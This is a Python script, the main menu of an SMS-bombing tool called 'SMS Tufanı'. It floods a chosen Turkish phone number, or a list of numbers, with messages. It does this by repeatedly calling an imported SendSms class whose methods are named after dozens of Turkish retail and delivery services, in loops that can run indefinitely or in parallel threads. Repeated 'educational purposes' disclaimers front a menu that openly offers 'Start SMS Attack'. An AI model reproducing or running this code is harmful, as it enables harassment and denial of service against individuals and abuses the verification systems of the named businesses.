import time
import os
from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait

def slow_print(text, delay=0.001, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)

def slow_print_more(text, delay=0.03, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)

def slow_print_more_more(text, delay=0.06, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

def check_skip_input():
    if os.name == 'nt':
        import msvcrt
        if msvcrt.kbhit():
            key = msvcrt.getch()
            if key == b'\x05':  # Ctrl + E
                return 'skip_animation'
            elif key == b'\x12':  # Ctrl + R
                return 'skip_legal'
            elif key == b'\x0f':  # Ctrl + O
                return 'skip_warning'
    return None

print(Fore.LIGHTBLUE_EX + """
You can skip the text currently on the screen by pressing Ctrl + R.
© 2024 SMS Tufanı. All rights reserved.

This software, developed under the name "SMS Tufanı," is designed solely for educational purposes and to raise cybersecurity awareness. Commercial use, misuse, or use for any illegal activities is prohibited. All rights to the code, design, and functionality of the software belong to the developer, and no part of this software may be copied, distributed, or reproduced without permission.

The user is fully responsible for any legal, technical, or personal issues arising from the use of the software, and the developer assumes no responsibility in such cases. The developer cannot be held liable for any damages that may occur during or after the use of this software.

By using this software, you agree to the terms outlined.
""")


if check_skip_input() == 'skip_legal':
    system("cls||clear")

time.sleep(1)
if os.name == 'nt':
    os.system('cls')  
else:
    os.system('clear')  

print(Fore.LIGHTBLUE_EX + """
You can skip the text currently on the screen by pressing Ctrl + R.
LICENSE AGREEMENT

This software includes the tool "SMS Tufanı," which has been developed solely for educational and instructional purposes. Commercial use, misuse, or use of this software for any illegal activities is strictly prohibited.

By using this software, the user accepts responsibility and acknowledges that the software cannot be modified, copied, reproduced, or distributed without permission.

The software developer cannot be held responsible for any issues arising during or after the use of this software, such as data loss, system failures, legal consequences, or damages caused to third parties.
""")


if check_skip_input() == 'skip_legal':
    system("cls||clear")

time.sleep(1)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

print(Fore.LIGHTBLUE_EX + """
You can skip the text currently on the screen by pressing Ctrl + R.
MIT License

This document permits any person who has a copy of this software to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, without restriction, under the following conditions:

© 2024 SMS Tufanı. All rights reserved.

The above copyright notice and this permission notice shall be included in all copies or significant portions of the software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY ARISING FROM THE USE OF THE SOFTWARE OR OTHERWISE IN CONNECTION WITH THE SOFTWARE.
""")


if check_skip_input() == 'skip_legal':
    system("cls||clear")

time.sleep(1)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

print(Fore.LIGHTBLUE_EX + """
You can skip the text currently on the screen by pressing Ctrl + R.
END USER LICENSE AGREEMENT (EULA)

By downloading, installing, or using this software, you agree to all the terms of this End User License Agreement (EULA). If you do not accept these terms, do not download, install, or use the software.

1. GRANT OF LICENSE
This software is for your personal use only. Copying, modifying, distributing, selling, or using the software commercially without written permission is prohibited.

2. USAGE CONDITIONS
You may only use the software for lawful purposes. The use of the software for any illegal activities, cyberattacks, spamming, or harm is strictly prohibited. The user agrees to use the software in compliance with these conditions.

3. UPDATES AND SUPPORT
The developer is not obligated to provide any updates or support for the software. If updates are provided, they will be subject to the terms of this EULA.
""")


if check_skip_input() == 'skip_legal':
    system("cls||clear")

time.sleep(1)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

print(Fore.LIGHTBLUE_EX + """
You can skip the text currently on the screen by pressing Ctrl + R.
4. DISCLAIMER OF LIABILITY AND LIMITATIONS
The software is provided "AS IS." The developer makes no warranty that the software will operate without errors, meet your needs, or cause no technical issues. The developer cannot be held responsible for any data loss, system failure, or legal issues arising during or after the use of the software.

5. LEGAL LIABILITY
By using the software, you are fully responsible for any legal consequences arising from the misuse of the software, its use in illegal activities, or damage caused to third parties. The developer assumes no responsibility in such cases.

6. TERMINATION
The developer has the right to terminate your use of the software in the event of a violation of this EULA. In case of termination, you must immediately stop using the software and delete all copies.

This EULA is effective from the moment you begin using the software and defines all legal boundaries for its use.
""")


if check_skip_input() == 'skip_legal':
    system("cls||clear")

time.sleep(1)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

print(Fore.LIGHTBLUE_EX + """
You can skip the text currently on the screen by pressing Ctrl + R.
DISCLAIMER

This software has been developed solely for educational purposes and to raise cybersecurity awareness. The use of this software for illegal, harmful, or malicious purposes is strictly prohibited. Users assume full legal responsibility while using this software, and the developer cannot be held liable for any consequences resulting from its misuse.

This software is provided to help developers improve their skills and create cybersecurity awareness. However, users are responsible for any legal consequences that may arise from using the software for harmful purposes.

By using this software, you confirm that you have read, understood, and accepted the above disclaimer.
""")


time.sleep(1)
system("cls||clear")


print(Fore.LIGHTBLUE_EX + """
You can skip the text currently on the screen by pressing Ctrl + R.
WARNING\n

This software has been developed solely for educational purposes, and it is strictly prohibited for users to misuse this tool or use it to cause harm to any person, organization, or entity. The purpose of this software is to raise awareness about cybersecurity and serve educational goals. Any legal, financial, moral, or technical issues that may arise from the misuse of this tool are entirely the responsibility of the user. As the developer, I hereby declare that I am not responsible for any data loss, system failure, legal sanctions, personal harm, or any damage caused to third parties during or after the use of this software. Using the software for purposes other than its intended use violates applicable laws and regulations, and the user acknowledges that they will be subject to all legal and criminal penalties in case of violation.

You can view the brands used in this code by inspecting the code itself. (Lines 374-422)
""")

time.sleep(2)
if os.name == 'nt':
    os.system('cls')  # Windows için
else:
    os.system('clear')  # Unix tabanlı sistemler için




while 1:
    system("cls||clear")
    slow_print(f"""{Fore.LIGHTCYAN_EX}
                  ______   __       __   ______   ________  __    __  ________  ______   __    __  ______ 
                 /      \\ /  \\     /  | /      \\ /        |/  |  /  |/        |/      \\ /  \\  /  |/      |
                /$$$$$$  |$$  \\   /$$ |/$$$$$$  |$$$$$$$$/ $$ |  $$ |$$$$$$$$//$$$$$$  |$$  \\ $$ |$$$$$$/ 
                $$ \\__$$/ $$$  \\ /$$$ |$$ \\__$$/    $$ |   $$ |  $$ |$$ |__   $$ |__$$ |$$$  \\$$ |  $$ |  
                $$      \\ $$$$  /$$$$ |$$      \\    $$ |   $$ |  $$ |$$    |  $$    $$ |$$$$  $$ |  $$ |  
                 $$$$$$  |$$ $$ $$/$$ | $$$$$$  |   $$ |   $$ |  $$ |$$$$$/   $$$$$$$$ |$$ $$ $$ |  $$ |  
                /  \\__$$ |$$ |$$$/ $$ |/  \\__$$ |   $$ |   $$ \\__$$ |$$ |     $$ |  $$ |$$ |$$$$ | _$$ |_ 
                $$    $$/ $$ | $/  $$ |$$    $$/    $$ |   $$    $$/ $$ |     $$ |  $$ |$$ | $$$ |/ $$   |
                 $$$$$$/  $$/      $$/  $$$$$$/     $$/     $$$$$$/  $$/      $$/   $$/ $$/   $$/ $$$$$$/ 
\n
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Tiktok: tiktok.com/@unknown_napim
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Youtube: youtube.com/@unknown_destroyer
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Youtube 2: youtube.com/@samhordesongs
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Discord: anonymous_destroyer01
                                   {Style.RESET_ALL}{Fore.LIGHTYELLOW_EX}Github: github.com/Unknowndestroy
   """)





    try:
        menu = input(Fore.LIGHTRED_EX + "1- Start SMS Attack (Normal, Slow [MULTI-Number-Attack Supported])\n\n2- Start SMS Attack (Turbo, Very Fast [Multi Number Attack Not Supported])\n\n3- Exit\n\n" + Fore.LIGHTYELLOW_EX + " Selection: ")
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        system("cls||clear")
        slow_print(Fore.LIGHTRED_EX + "Invalid input, please try again.")
        sleep(3)
        continue

    if menu == 3:
        system("cls||clear")
        slow_print(Fore.LIGHTYELLOW_EX + "Exiting...\n")
        break

    if menu == 1:
        system("cls||clear")
        slow_print(Fore.LIGHTRED_EX + "\nAre you sure to continue?\n")
        slow_print(Fore.LIGHTYELLOW_EX + "Yes (y) / No (n): ", end="")
        confirmation = input().lower()

        if confirmation != 'y':
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Operation cancelled. Sending you to main menu...")
            sleep(3)
            continue

        slow_print(Fore.LIGHTYELLOW_EX + "Write the phone number without the '+90' on start. (If more than one, Type 'MULTI'.): ", end="")
        tel_no = input()
        tel_liste = []

        if tel_no == "Multi":
            system("cls||clear")
            slow_print(Fore.LIGHTYELLOW_EX + "Input the path of the TXT file that contains phone numbers: ", end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                slow_print(Fore.LIGHTRED_EX + "Invalid path. Please try again. If you created the file when SMSTufanı is open, restart the SMSTufanı.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(If infinite, press 'Enter')"  
            except ValueError:
                system("cls||clear")
                slow_print(Fore.LIGHTRED_EX + "Invalid phone number. Please try again.") 
                sleep(3)
                continue

        system("cls||clear")
        try:
            slow_print(Fore.LIGHTYELLOW_EX + "Mail adress (If you dont know, press 'Enter'.): ", end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Invalid mail adress. Please try again.") 
            sleep(3)
            continue

        system("cls||clear")
        try:
            slow_print(Fore.LIGHTYELLOW_EX + f"How much sms do you want to send? {sonsuz}: ", end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Invalid input. Please try again.") 
            sleep(3)
            continue

        system("cls||clear")
        try:
            slow_print(Fore.LIGHTYELLOW_EX + "How much delay you want between of the per sms: ", end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Invalid input. Please try again.") 
            sleep(3)
            continue

        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms." + attribute + "()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                while sms.adet < kere:
                    for attribute in dir(SendSms):
                        attribute_value = getattr(SendSms, attribute)
                        if callable(attribute_value):
                            if attribute.startswith('__') == False:
                                if sms.adet == kere:
                                    break
                                exec("sms." + attribute + "()")
                                sleep(aralik)
        print(Fore.LIGHTGREEN_EX + "\nSuccessfull. Press 'Enter' to go back to menu")
        input()
    elif menu == 3:
        system("cls||clear")
        slow_print(Fore.LIGHTRED_EX + "Exiting...")
        break
    elif menu == 2:
        system("cls||clear")
        slow_print(Fore.LIGHTYELLOW_EX + "Input the phone number wıthout '+90' at start: ", end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Invalid phone number, please try again.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            slow_print(Fore.LIGHTYELLOW_EX + "Mail adress (If you dont know, press 'Enter'): ", end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Invalid mail adress. Please try again.") 
            sleep(3)
            continue
        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(send_sms.Joker),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(send_sms.KimGb),
                        executor.submit(send_sms.Komagene),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(send_sms.Macro),
                        executor.submit(send_sms.Metro),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(send_sms.Paybol),
                        executor.submit(send_sms.Pidem),
                        executor.submit(send_sms.Porty),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(send_sms.Suiste),
                        executor.submit(send_sms.Taksim),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(send_sms.Tazi),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(send_sms.Ucdortbes),
                        executor.submit(send_sms.Uysal),
                        executor.submit(send_sms.Wmf),
                        executor.submit(send_sms.Yapp),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(send_sms.Yuffi),
                    ]
                    wait(futures)
                sleep(5)  
        except KeyboardInterrupt:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "SMS Attack stopped..") 
            sleep(3)
            continue

        print(Fore.LIGHTGREEN_EX + "\nSuccesfull. Press 'Enter' to go back to menu.")
        input()

